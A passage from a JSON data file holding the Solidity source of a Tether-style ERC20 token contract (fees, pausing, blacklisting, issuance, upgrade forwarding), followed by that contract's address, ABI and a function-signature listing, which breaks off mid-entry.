transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0xe982E462b094850F12AF94d21D470e21bE9D0E9C",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          